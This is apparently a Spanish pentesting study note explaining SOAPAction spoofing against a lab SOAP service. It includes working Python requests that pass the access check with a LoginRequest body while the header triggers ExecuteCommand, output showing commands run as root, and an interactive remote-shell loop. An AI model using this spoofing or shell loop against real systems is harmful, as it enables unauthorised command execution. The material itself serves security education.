---
tags:
  - Web/Red-Team
  - Web-Services
  - Pentesting/Explotacion
Descripción: "Un mensaje SOAP lleva la operación a ejecutar en el primer hijo de soap:Body"
Fecha de actualización: 2026-07-17
Nota previa: "[[01 - WSDL - enumeración y descubrimiento]]"
Nota siguiente: "[[03 - Command Injection en Web Services]]"
Area: "[[Web Services.base|Web Services]]"
---
---

Un mensaje SOAP lleva la operación a ejecutar en el primer hijo de `soap:Body`. Pero cuando el transporte es HTTP, se permite además una cabecera **`SOAPAction`** con el nombre de la operación, para que el servicio la identifique **sin parsear el XML**. Ahí está el fallo: <mark style="background: #ADCCFFA6;">si el servicio decide qué operación ejecutar mirando **solo** la cabecera `SOAPAction`, es vulnerable a *SOAPAction spoofing*</mark> — un desincronismo entre lo que autoriza una capa y lo que ejecuta otra.

# El escenario

Del [[01 - WSDL - enumeración y descubrimiento|WSDL]] sabemos que hay dos operaciones: `Login` (accesible desde fuera) y `ExecuteCommand` (con parámetro `cmd`). Una petición legítima a `ExecuteCommand` se bloquea:

```python
import requests
payload = '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'
print(requests.post("http://<TARGET>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
# → <error>This function is only allowed in internal networks</error>
```

# El spoofing

La clave: montar la petición para que **pase el control de acceso pero ejecute la operación prohibida**. Se combinan tres piezas:

1. En el `soap:Body` va **`LoginRequest`** — la operación permitida desde fuera → la petición **pasa el filtro**.
2. Dentro se colocan los **parámetros de `ExecuteCommand`** (`<cmd>whoami</cmd>`) — lo que queremos ejecutar.
3. En la cabecera va **`SOAPAction: "ExecuteCommand"`** — la operación prohibida que el *dispatcher* acabará ejecutando.

```python
import requests
payload = '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'
print(requests.post("http://<TARGET>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
# → <success>true</success><result>root\n</result>
```

<mark style="background: #FF5582A6;">El `whoami` se ejecuta como `root`, saltándose la restricción</mark>. La capa que autoriza mira el cuerpo (`LoginRequest`, permitido); la que ejecuta confía en `SOAPAction` (`ExecuteCommand`). <mark style="background: #8000E1A6;">Es un *confused deputy*: dos componentes con visiones distintas de "qué operación es esta"</mark>.

> [!success]+ Shell interactiva
> Para no reescribir el script por comando, un bucle que reutiliza el spoofing:
> ```python
> import requests
> while True:
>     cmd = input("$ ")
>     payload = f'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
>     print(requests.post("http://<TARGET>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
> ```

> [!important]+ El patrón, más allá de SOAP
> SOAPAction spoofing es un caso concreto de un patrón que se repite en toda la web moderna: <mark style="background: #FFB86CA6;">**dos componentes toman decisiones sobre la misma petición usando campos distintos**</mark>. Es el mismo desincronismo que en [[06 - Introducción a HTTP Request Smuggling|HTTP Request Smuggling]] (front vs back parsean `Content-Length`/`Transfer-Encoding` distinto) o en *verb tampering*. Cuando audites cualquier API, busca dónde la autorización y el *routing* leen fuentes diferentes.

Siguiente vector clásico en web services — la ejecución de comandos directa: [[03 - Command Injection en Web Services]].
